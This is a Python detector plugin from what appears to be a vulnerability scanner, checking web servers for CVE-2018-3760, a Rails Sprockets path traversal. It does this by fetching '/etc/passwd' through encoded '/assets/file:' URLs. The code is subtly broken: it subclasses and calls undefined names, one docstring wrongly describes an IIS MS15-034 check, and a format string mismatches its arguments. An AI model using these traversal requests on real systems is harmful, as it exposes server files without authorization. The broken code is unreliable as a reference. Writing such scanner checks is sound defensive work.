from cystack_scanner.core.controller.plugin import DetectorPlugin
from cystack_scanner.knowledge_base.data_container.domain import Domain
from cystack_scanner.knowledge_base.data_container.http.headers import HTTPHeaders
from cystack_scanner.misc.utils.logger import singleton_logger as core_logger

import re


class cve_2018_3760(InfrastructurePlugin):
	"""
	Detect CVE-2018-3760 (Path Traversal in Sprockets)
	"""
	NAME = "CVE 2018-3760"
	RESOURCE_TYPES = [ URL ]
	CS_VULN_TEMPLATE_ID = "2000030"

	@runonce(exc_class=RunOnce)
	def discover(self, fuzzable_http_request):
		"""
		Checks if the remote IIS is vulnerable to MS15-034
		"""
		url = fuzzable_http_request.get_url()
		url = url.url_join("/assets/file:%2f%2f/etc/passwd")
		response = self.requestor.http.GET(url, cache=False, grep=False)

		match =  re.search("/etc/passwd is no longer under a load path: (\S+),?", response.get_body())
		vuln_data = {
			"file": "/etc/passwd",
		}
		if match:
			allowed_path = match.group(1).strip(",")
			url = fuzzable_http_request.get_url()
			skipper = "/%252e%252e" * (allowed_path.count("/"))
			url = url.url_join("/assets/file:%2f%2f{allowed_path}{skipper}/etc/passwd".format(allowed_path, skipper))
			response = self.requestor.http.GET(url, cache=False, grep=False)
			vuln_data["allowed_path"] = allowed_path

		if "root:x:" in response.get_body():
			fr = FuzzableHTTPRequest.from_http_response(response)
			vuln = self.create_vuln("CVE-2018-3760 (Path Traversal in Sprockets)", traffic_ids=response.id, mutant=fr, data=vuln_data)
			self.save_vuln(vuln, vuln_type="rails")



